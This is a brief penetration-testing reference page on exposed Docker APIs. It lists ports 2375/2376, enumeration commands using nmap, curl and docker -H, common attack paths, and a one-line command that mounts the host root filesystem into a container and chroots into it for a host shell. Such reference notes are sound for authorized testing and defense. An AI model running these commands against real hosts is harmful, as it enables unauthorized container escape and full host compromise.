# Docker API

## Overview

Remote Docker daemon access and container-to-host abuse when the API is exposed or the socket is reachable.

## Default Ports

- 2375/tcp plaintext API, 2376/tcp TLS

## Quick Enumeration

```bash
nmap -sV -p 2375,2376 <target>
curl http://<target>:2375/version
curl http://<target>:2375/containers/json
docker -H tcp://<target>:2375 ps
```

## Common Attack Paths

- Unauthenticated Docker API exposure on 2375.
- Container creation with host mounts to read `/`, drop SSH keys, or escape into the host namespace.
- Abuse of existing privileged containers, Docker socket mounts, or image pull/run rights after foothold.

## Mount-and-Escape Pattern

```bash
docker -H tcp://<target>:2375 run --rm -it -v /:/host alpine chroot /host /bin/sh
```

## See Also

- `12 Cloud/Containers and Kubernetes.md`
- `05 Linux/Privilege Escalation.md`
